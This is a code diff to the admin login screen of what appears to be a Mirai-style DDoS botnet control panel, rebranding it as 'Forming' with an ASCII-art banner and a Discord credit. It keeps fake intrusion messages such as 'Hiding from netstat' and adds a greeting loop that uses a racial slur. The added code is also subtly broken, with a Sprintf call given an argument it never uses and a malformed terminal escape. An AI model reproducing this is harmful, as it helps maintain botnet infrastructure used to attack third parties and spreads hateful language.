@@ -53,7 +53,7 @@ func (this *Admin) Handle() {
     this.conn.Write([]byte("\r\n"))
     spinBuf := []byte{'-', '\\', '|', '/'}
     for i := 0; i < 15; i++ {
-        this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i % len(spinBuf)]))
+        this.conn.Write(append([]byte("\r\033[37;Loading... \033[31m"), spinBuf[i % len(spinBuf)]))
         time.Sleep(time.Duration(300) * time.Millisecond)
     }
 
@@ -69,18 +69,23 @@ func (this *Admin) Handle() {
 
     this.conn.Write([]byte("\r\n\033[0m"))
     this.conn.Write([]byte("[+] DDOS | Succesfully hijacked connection\r\n"))
-    time.Sleep(250 * time.Millisecond)
     this.conn.Write([]byte("[+] DDOS | Masking connection from utmp+wtmp...\r\n"))
-    time.Sleep(500 * time.Millisecond)
     this.conn.Write([]byte("[+] DDOS | Hiding from netstat...\r\n"))
-    time.Sleep(150 * time.Millisecond)
     this.conn.Write([]byte("[+] DDOS | Removing all traces of LD_PRELOAD...\r\n"))
-    for i := 0; i < 4; i++ {
-        time.Sleep(100 * time.Millisecond)
-        this.conn.Write([]byte(fmt.Sprintf("[+] DDOS | Wiping env libc.poison.so.%d\r\n", i + 1)))
-    }
     this.conn.Write([]byte("[+] DDOS | Setting up virtual terminal...\r\n"))
     time.Sleep(1 * time.Second)
+    this.conn.Write([]byte("          Welcome to Forming         \r\n"))
+    this.conn.Write([]byte("   MADE BY zphantom#7626 - Discord  \r\n"))
+    this.conn.Write([]byte("███████╗ ██████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗ ██████╗\r\n"))
+    this.conn.Write([]byte("██╔════╝██╔═══██╗██╔══██╗████╗ ████║██║████╗  ██║██╔════╝ \r\n"))
+    this.conn.Write([]byte("█████╗  ██║   ██║██████╔╝██╔████╔██║██║██╔██╗ ██║██║  ███╗\r\n"))
+    this.conn.Write([]byte("██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██║   ██║\r\n"))
+    this.conn.Write([]byte("██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝\r\n"))
+    this.conn.Write([]byte("╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ \r\n"))
+    for i := 0; i < 4; i++ {
+        time.Sleep(100 * time.Millisecond)
+        this.conn.Write([]byte(fmt.Sprintf("Welcome nigga enjoy the net asf! and follow the sentences below!\r\n", i + 1)))
+    }
 
     go func() {
         i := 0
